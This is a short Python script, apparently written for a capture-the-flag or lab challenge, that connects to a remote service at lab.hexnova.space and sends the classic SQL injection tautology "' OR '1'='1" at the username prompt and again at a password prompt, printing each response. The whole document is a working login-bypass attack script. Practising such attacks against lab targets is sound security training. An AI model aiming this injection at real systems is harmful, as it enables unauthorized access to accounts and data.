import socket, time

s = socket.socket()
s.connect(('lab.hexnova.space', 30859))
s.settimeout(5)
buf = b''
while b'> ' not in buf:
    try: buf += s.recv(4096)
    except: break
print('Prompt:', buf.decode(errors='replace'))

# Classic tautology
payload = b"' OR '1'='1\n"
s.sendall(payload)
time.sleep(1)
buf2 = b''
for _ in range(10):
    try: buf2 += s.recv(4096)
    except: break
print('Response:', buf2.decode(errors='replace'))

# if password prompt
if b'>' in buf2:
    s.sendall(b"' OR '1'='1\n")
    time.sleep(1)
    buf3 = b''
    for _ in range(5):
        try: buf3 += s.recv(1024)
        except: break
    print('Pass response:', buf3.decode(errors='replace'))

s.close()
